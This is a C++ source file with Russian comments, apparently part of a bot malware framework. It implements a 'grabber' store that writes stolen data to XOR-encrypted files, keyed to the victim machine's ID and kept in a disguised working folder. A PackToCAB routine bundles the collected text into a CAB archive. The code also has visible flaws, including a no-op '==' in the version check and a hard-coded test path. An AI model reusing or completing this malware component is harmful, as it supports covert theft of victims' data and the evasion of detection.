//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotCore.h"
#include "Grabbers.h"
#include "StrConsts.h"

//---------------------------------------------------------------------------

// Пароль шифрования данных грабера
char GrabberPassword[5] = {0};

const char* GrabbersWorkWolder = "NGWF";
const char* GrabbersFileExt    = ".ngdf";

//-------------------------------------------
//  GetGrabbersPath - Функция возвращет имя
//                рабочего каталога грабера
//-------------------------------------------
string GetGrabbersPath()
{
	return BOT::MakeFileName(GrabbersWorkWolder, NULL);
}

//-------------------------------------------
//  GetGrabberFileName - Функция создаёт имя
//                       файла грабера.
//-------------------------------------------
string GetGrabberFileName(const string& GrabberName)
{
	string Tmp = (!GrabberName.IsEmpty()) ? GrabberName : Random::RandomString2(10, 'A', 'Z');
	DWORD Hash = Tmp.Hash();
	string ShortName;
    ShortName.LongToStr(Hash);
	ShortName += GrabbersFileExt;
	string Name = GetGrabbersPath();
	Name += ShortName;
	return Name;
}


//-------------------------------------------
// Функция генерирует пароль шифрования
// данных грабера
//-------------------------------------------
PCHAR MakeGrabberFilePassword()
{
	if (!GrabberPassword[0])
	{
		// Генерируем пароль
		m_memset(GrabberPassword, 0, sizeof(GrabberPassword));
		PCHAR ID = MakeMachineID();
		DWORD Hash = STRA::Hash(ID);
		STR::Free(ID);
		string Temp;
		WORD NW = LOWORD(Hash) + HIWORD(Hash);
		Temp.Format("%X", NW);
		m_memcpy(GrabberPassword, Temp.t_str(), 4);
    }
	return GrabberPassword;
}





// Описание заголовка файла грабера
#pragma pack(push, 1)
struct TGrabberFileHead
{
	DWORD Signature;  // Сигнатура файла
	DWORD Version;    // Версия файла
	DWORD Type;       // Тип файла
	DWORD Flags;      // Флаги файла
	DWORD FlagsEx;    // Дополнительные флаги
};
#pragma pack(pop)


// описание заголовка блока данных грабера
#pragma pack(push, 1)
struct TGrabberBlockHead
{
	DWORD Signature;  // Сигнатура блока
	DWORD Type;       // Тип данных блока
	DWORD DataSize;   // Размер данных блока
};
#pragma pack(pop)




//=============================================================================
//  TGrabberFile - Базовый класс для работы с файлом
//                 грабера
//=============================================================================
TGrabberFile::TGrabberFile(const string& GrabberName)
{
	// Создаём имя файла
	FBlocks = new TBotCollection();
	FGrabberName = GrabberName;
	FFileName    = GetGrabberFileName(GrabberName);
	FPassword    = MakeGrabberFilePassword();
	FStream = NULL;
}

TGrabberFile::~TGrabberFile()
{
	CloseFile();
	delete FBlocks;
}

//-------------------------------------------
// Функция возвращет истину если в данный
// момент фал открыт
//-------------------------------------------
bool TGrabberFile::Active()
{
	return FStream != NULL;
}


//-------------------------------------------
// CloseFile - Функция закрывает открытый
//             файл
//-------------------------------------------
void TGrabberFile::CloseFile()
{
	if (FStream)
	{
		delete FStream;
		FStream = NULL;
    }
}

//-------------------------------------------
//  Create - Функция создаёт файл грабера
//-------------------------------------------
bool TGrabberFile::Create()
{
	// Закрываем открытый файл
	CloseFile();

	// Открываем файл
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmCreate | fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

    // Файл успешно создан
	FStream = Stream;
	if (!UpdateFileHeader(true))
	{
		// В случае ошибки закрываем файл и удаляем его
		CloseFile();
		pDeleteFileA(FFileName.t_str());
    }

	return FStream != NULL;
}


//-------------------------------------------
// Open - Функция открывает ранее созданный
//        файл грабера
//-------------------------------------------
bool TGrabberFile::Open()
{
	// Закрываем открытый файл
	CloseFile();

	// Открываем файл
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

	FStream = Stream;
	// Файл успешно создан, читам заголовок
	TGrabberFileHead H;
	ClearStruct(H);

	bool Result = FStream->Read(&H, sizeof(H)) == sizeof(H);
	if (Result)
	{
		// Проверяем сигнатуру
		Result = H.Signature == GRABBER_FILE_SIGNATURE;

		// Проверяем версию
		if (Result)
			Result == H.Version <= GRABBER_FILE_VERSION;

		FType = H.Type;

		// Читаем имя грабера
		if (Result)
			Result = ReadSizedString(FGrabberName);

		// Запоминаем позицию начала блоков данных
        FBlocksStart = FStream->Position();
	}

	if (!Result)
		CloseFile();

	return Result;
}

//-------------------------------------------
// UpdateFileHeader - функция обновляет
// заголовок файла грабера
//-------------------------------------------
bool TGrabberFile::UpdateFileHeader(bool WriteName)
{
	if (!Active()) return false;

	TGrabberFileHead H;
	ClearStruct(H);

	H.Signature = GRABBER_FILE_SIGNATURE;
	H.Version   = GRABBER_FILE_VERSION;
	H.Type      = FType;

    FStream->Seek(0, SO_BEGIN);

	bool Result = FStream->Write(&H, sizeof(H)) == sizeof(H);

	if (Result && WriteName)
		Result = WriteSizedString(FGrabberName);

	return Result;
}


//-------------------------------------------
//  WriteData - Функция записывает блок
//              данных.
//-------------------------------------------
bool TGrabberFile::WriteData(LPVOID Data, DWORD Size, bool WriteSize)
{
	if (!FStream) return false;
	bool Result = true;
    if (WriteSize)
		Result = FStream->Write(&Size, sizeof(Size)) == sizeof(Size);

	if (Result && Size)
	{
		// Копируем данные во временный буфер и шифруем их
		TMemory M(Size);
		M.Write(Data, Size);

		// Шифруем данные
		XORCrypt::Crypt(FPassword, (LPBYTE)M.Buf(), Size);
		// Записываем
		Result = FStream->Write(M.Buf(), Size) == Size;
	}

	return Result;
}

//-------------------------------------------
//  Функция записывает строку с размером
//-------------------------------------------
bool TGrabberFile::WriteSizedString(const string &Str)
{
	return WriteData(Str.t_str(), Str.Length(), true);
}


//-------------------------------------------
//  ReadData - Функция читает блок данных
//  размером  DataSize в буфер Buf
//-------------------------------------------
bool TGrabberFile::ReadData(LPVOID Buf, DWORD DataSize)
{
	if (!FStream) return false;
	if (!DataSize) return true;

	bool Result = FStream->Read(Buf, DataSize) == DataSize;
	if (Result)
	{
		// Расшифровываем данные
		XORCrypt::Crypt(FPassword, (LPBYTE)Buf, DataSize);
	}
	return Result;
}

//-------------------------------------------
//  Функция читаем строку указанного размера
//-------------------------------------------
bool TGrabberFile::ReadString(DWORD StringSize, string &Str)
{
	if (!FStream) return false;
	Str.SetLength(StringSize);
	bool Result = ReadData(Str.t_str(), StringSize);
	if (!Result) Str.Clear();
	return Result;
}

//-------------------------------------------
//  Функция читаем строку перед которой
//  записан её размер
//-------------------------------------------
bool TGrabberFile::ReadSizedString(string &Str)
{
	if (!FStream) return false;
	DWORD Size;
	bool Result = FStream->Read(&Size, sizeof(Size)) == sizeof(Size);
	if (Result)
		Result = ReadString(Size, Str);
	return Result;
}


//-------------------------------------------
// Функция добавляет текстовые данные
//-------------------------------------------
bool TGrabberFile::AddText(const string& Name, const string& Data)
{
	if (!Active() || Name.IsEmpty() || Data.IsEmpty())
		return false;
	TGrabberBlock B(this);
	return B.WriteText(Name, Data);
}

//-------------------------------------------
//  Функция загруает блоки данных
//-------------------------------------------
bool TGrabberFile::ReadBlocks()
{
	if (!Active()) return false;
	FBlocks->Clear();

	// Переходим к началу первого блока
	FStream->Seek(FBlocksStart, SO_BEGIN);

	while (true)
	{
		TGrabberBlock* Block = new TGrabberBlock(this);

		// читаем данные
		if (!Block->Read())
		{
			// Ошибка чтения блока.
			delete Block;
			break;
		}

		if (!Block->FIgnoreBlock)
			Block->SetOwner(FBlocks);
		else
			delete Block;
    }

	return FBlocks->Count() > 0;
}

//-------------------------------------------
//  Функция упаковывает текстовые блоки
//-------------------------------------------
string TGrabberFile::DoPackTextData()
{
	string Result;
	int Count = FBlocks->Count();
	if (Count > 0)
	{
		TBotStrings S;
        S.ValueDelimeter = ": ";
		for (int i = 0; i < Count; i++)
		{
			TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);;
			if (Block->FDataType != GRABBER_DATA_TEXT)
				continue;
            S.AddValue(Block->FName, Block->FAsString);
		}
		if (S.Count() > 0)
			Result = S.GetText();
    }

	return Result;
}


//-------------------------------------------
// PackToCAB - Функция запаковывает данные
//             в каб архив.
// В случае успеха функция возвращает имя
// фала с каб архивом
//-------------------------------------------
string TGrabberFile::PackToCAB()
{
	string FileName;
	if (ReadBlocks())
	{
		FileName = "c:\\temp\\testGrabber.cab"; //File::GetTempName2A();
		LPVOID Cab = CreateCab(FileName.t_str());
		if (Cab)
		{
			// Запаковываем текстовые данные
			string TextLog = DoPackTextData();
			if (!TextLog.IsEmpty())
				AddStringToCab(Cab, TextLog, GetStr(StrLogFileTextData));


            // Закрываем каб
			CloseCab(Cab);
        }
    }

    return FileName;
}




bool TGrabberFile::Test()
{
	string S1 = "test line";
	string S2;
	DWORD Pos = FStream->Position();
	WriteSizedString(S1);
	FStream->SetPosition(Pos);
	ReadSizedString(S2);

	return S1 == S2;
}



//=============================================================================
//  TGrabberBlock - Блок данных грабера
//=============================================================================
TGrabberBlock::TGrabberBlock(TGrabberFile* File)
	: TBotCollectionItem(NULL)
{
	Initialize();
	FFile = File;
}

TGrabberBlock::~TGrabberBlock()
{
	Clear();
}

//-------------------------------------------
// Функция инициализирует переменные класса
//-------------------------------------------
void TGrabberBlock::Initialize()
{
	FDataSize = 0;
	FDataType = 0;
}


//-------------------------------------------
//  Write - Функция записывает данные блока
//          в файл
//-------------------------------------------
bool TGrabberBlock::Write(LPVOID Data, DWORD DataSize)
{
	if (!FFile || !FFile->Active())
		return false;

	// переходим в конец файла
	FFile->FStream->Seek(0, SO_END);

	// Записываем заголовок блока
	TGrabberBlockHead H;
	H.Signature = GRABBER_FILE_BLOCK_SIGNATURE;
	H.Type      = FDataType;
	H.DataSize  = DataSize;

	// Пишем заголовок
	bool Result = FFile->FStream->Write(&H, sizeof(H)) == sizeof(H);

	// записываем имя блока
	if (Result)
		Result = FFile->WriteSizedString(FName);


	// Пишем данные
	if (Result)
		Result = FFile->WriteData(Data, DataSize, false);

	return Result;
}


//-------------------------------------------
// Read - Функция читает данные блока
//-------------------------------------------
bool TGrabberBlock::Read()
{
	if (!FFile || !FFile->Active())
		return false;

	Clear();

	// Читаем заголовки блока
	TGrabberBlockHead H;
	ClearStruct(H);

	// Читаем заголовок
	bool Result = FFile->FStream->Read(&H, sizeof(H)) == sizeof(H);

    // Проверяем сигнатуру блока
	if (Result)
		Result = H.Signature == GRABBER_FILE_BLOCK_SIGNATURE;

	// Читаем имя блока
	if (Result)
		Result = FFile->ReadSizedString(FName);

	if (Result)
	{
		FDataType = H.Type;
		FDataSize = H.DataSize;

		Result = ReadBlockData();
    }


	return Result;
}

//-------------------------------------------
// Функция читает данные блока
//-------------------------------------------
bool TGrabberBlock::ReadBlockData()
{
	if (!FDataSize) return true;

	switch (FDataType)
	{
		// Читаем текстовый блок
		case GRABBER_DATA_TEXT: return FFile->ReadString(FDataSize, FAsString);
	}

	// Нет специализированного обработчика, читаем как обычные бинарные данные
	// Для удобаства преобразований добавляем ноль в конце
	FAsBlob = (LPBYTE)MemAlloc(FDataSize + 1);
	*(FAsBlob + FDataSize) = 0;
	return FFile->ReadData(FAsBlob, FDataSize);
}



//-------------------------------------------
//  Clear - Функция очищает данные блока
//-------------------------------------------
void TGrabberBlock::Clear()
{
	FName.Clear();
	FFileName.Clear();
	FInternalFileName.Clear();
	FAsString.Clear();
	FDataSize = 0;
	FDataType = 0;
	FIgnoreBlock = false;
}

//-------------------------------------------
//  WriteText - Функция записывает в файл
//              текстовый блок
//-------------------------------------------
bool TGrabberBlock::WriteText(const string& Name, const string& Data)
{
	Clear();
	FName     = Name;
	FDataType = GRABBER_DATA_TEXT;
	return Write(Data.t_str(), Data.Length());
}
